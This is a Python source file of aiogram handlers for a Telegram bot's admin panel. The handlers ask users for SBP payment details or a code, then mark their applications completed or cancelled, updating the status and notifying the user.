from aiogram import Router, F, Bot
from aiogram.types import CallbackQuery, Message
from aiogram.fsm.context import FSMContext

from config import ADMIN_ID, NOTIFY_CHANNEL_ID
from states import AdminStates
from database import get_app, update_app

router = Router()

@router.callback_query(F.data.startswith("admin_req_sbp:"))
async def admin_request_requisites(callback: CallbackQuery, bot: Bot):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ Доступ запрещен!", show_alert=True)
        return

    _, app_id_str, target_user_id_str = callback.data.split(":")
    app_id = int(app_id_str)
    target_user_id = int(target_user_id_str)

    update_app(app_id, status="Запрошены реквизиты")
    await callback.answer("✅ Уведомление отправлено пользователю!")

    try:
        await bot.send_message(
            chat_id=target_user_id,
            text=f"💬 <b>Администратор запросил реквизиты по заявке #{app_id}!</b>\n\nОтправьте их ответным сообщением или в поддержку.",
            parse_mode="HTML"
        )
    except Exception:
        pass

    app_data = get_app(app_id)
    if app_data and app_data[7]: # channel_message_id
        old_text = callback.message.text
        new_text = old_text.replace("Статус: ⏳ Запрос реквизитов", "Статус: 💬 Реквизиты запрашиваются")
        await callback.message.edit_text(new_text, reply_markup=callback.message.reply_markup, parse_mode="HTML")

@router.callback_query(F.data.startswith("admin_req_code:"))
async def admin_request_code(callback: CallbackQuery, bot: Bot):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ Доступ запрещен!", show_alert=True)
        return

    _, app_id_str, target_user_id_str = callback.data.split(":")
    app_id = int(app_id_str)
    target_user_id = int(target_user_id_str)

    update_app(app_id, status="Запрошен код")
    await callback.answer("✅ Запрос кода отправлен!")

    try:
        await bot.send_message(
            chat_id=target_user_id,
            text=f"📲 <b>Администратор запросил код по заявке #{app_id}!</b>\n\nПожалуйста, отправьте код в чат.",
            parse_mode="HTML"
        )
    except Exception:
        pass

@router.callback_query(F.data.startswith("admin_done:"))
async def admin_done_app(callback: CallbackQuery, bot: Bot):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ Доступ запрещен!", show_alert=True)
        return

    _, app_id_str, target_user_id_str = callback.data.split(":")
    app_id = int(app_id_str)
    target_user_id = int(target_user_id_str)

    update_app(app_id, status="Успешно завершено")
    await callback.answer("✅ Заявка закрыта!")

    try:
        await bot.send_message(
            chat_id=target_user_id,
            text=f"✅ <b>Ваша заявка #{app_id} успешно выполнена!</b>",
            parse_mode="HTML"
        )
    except Exception:
        pass

    try:
        await callback.message.edit_text(f"✅ <b>Заявка #{app_id} ЗАВЕРШЕНА</b>", parse_mode="HTML")
    except Exception:
        pass

@router.callback_query(F.data.startswith("admin_cancel:"))
async def admin_cancel_app(callback: CallbackQuery, bot: Bot):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ Доступ запрещен!", show_alert=True)
        return

    _, app_id_str, target_user_id_str = callback.data.split(":")
    app_id = int(app_id_str)
    target_user_id = int(target_user_id_str)

    update_app(app_id, status="Отменено")
    await callback.answer("❌ Заявка отменена.")

    try:
        await bot.send_message(
            chat_id=target_user_id,
            text=f"❌ <b>Ваша заявка #{app_id} была отменена администратором.</b>",
            parse_mode="HTML"
        )
    except Exception:
        pass

    try:
        await callback.message.edit_text(f"❌ <b>Заявка #{app_id} ОТМЕНЕНА</b>", parse_mode="HTML")
    except Exception:
        pass